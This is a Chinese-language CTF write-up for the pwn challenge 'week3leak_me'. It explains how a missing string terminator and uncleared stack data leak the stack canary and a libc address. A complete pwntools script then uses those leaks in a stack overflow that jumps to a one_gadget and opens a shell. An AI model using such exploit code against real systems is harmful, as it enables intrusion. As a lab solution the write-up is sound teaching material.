# week3leak_me

## 题目简述

程序把未以 `\x00` 终止的栈缓冲区当作字符串回显，且复用的栈空间没有清零。通过逐步覆盖字符串终止字节，可以先越界泄露 Canary，再继续泄露保存的 libc 返回地址，最后带回正确 Canary 完成栈溢出。

## 解题过程

Canary 的最低字节固定为 `\x00`，正常字符串输出会在此停止。缓冲区到 Canary 的距离是 `0x38`；发送 `0x39` 个小写 `a`，会把最低字节从 `0x00` 改成 `0x61`，使回显继续输出 Canary 后面的 7 个随机字节。把泄露出的 8 字节小端整数减去 `0x61`，即可恢复原 Canary。

接着发送 `0x48` 字节，覆盖到保存返回地址之前，使回显继续带出位于栈上的 `__libc_start_main+240`。完整流程如下：

```python
from pwn import *

context.arch = "amd64"
io = process("./main")
libc = ELF("./libc-2.23.so", checksec=False)

io.recvline()
io.recvline()

# 覆盖 Canary 的终止零字节并泄露其余内容。
io.send(b"a" * 0x39)
io.recvn(0x38)
canary = u64(io.recvn(8)) - ord("a")
log.success(f"canary: {canary:#x}")
io.recvline()

# 继续越过 Canary 和保存的 rbp，泄露 libc 返回地址。
io.send(b"a" * 0x48)
leak = io.recvuntil(b"\x7f")
libc_return = u64(leak[-6:].ljust(8, b"\x00"))
libc.address = libc_return - libc.sym["__libc_start_main"] - 240
log.success(f"libc base: {libc.address:#x}")
io.recvline()

one_gadget = libc.address + 0x45226

io.recvline()
payload = flat(b"a" * 0x38, canary, 0, one_gadget)
io.send(payload)

# 按题目交互流程结束当前输入，使漏洞函数返回并触发 ROP。
io.recvline()
io.recvline()
io.send(b"exit\x00")
io.interactive()
```

## 方法总结

本题利用的是“缺少终止符 + 未清理栈数据”造成的连续越界读。第一阶段只覆盖 Canary 的零字节，第二阶段再推进到 libc 指针；最终利用时必须把恢复后的 Canary 原样写回。`0x45226` 与 `__libc_start_main+240` 偏移都依赖题目指定的 libc 2.23。
